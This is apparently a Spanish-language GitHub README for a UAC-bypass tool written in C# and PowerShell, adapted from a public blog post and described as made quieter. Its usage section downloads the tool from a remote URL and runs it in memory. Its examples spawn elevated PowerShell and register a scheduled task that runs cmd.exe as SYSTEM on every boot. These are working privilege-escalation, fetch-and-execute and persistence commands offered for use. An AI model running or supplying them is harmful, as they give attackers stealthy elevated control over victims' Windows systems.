# Bypass-Uac
Un simple bypass de uac con c# y powershell, creditos al blog de zc00l: https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html, de esta fuente tome el codigo original del bypass de uac y lo mejore para que sea mas silencioso.

# Uso:

Con este codigo cargamos Invoke-UAC dentro de Powershell desde la memoria
```
iex (iwr -UsebasicParsing https://raw.githubusercontent.com/BlackShell256/Bypass-Uac/main/Invoke-UAC.ps1)
```

Ya podemos llamar a Invoke-UAC, dejo unos ejemplos sencillos
```
Invoke-UAC -Executable powershell
```

```
Invoke-UAC -Executable powershell -Command "ls"
```

```
Invoke-UAC -Executable schtasks -Command "/create /tn UAC /tr 'cmd.exe' /sc onstart /ru System"
```
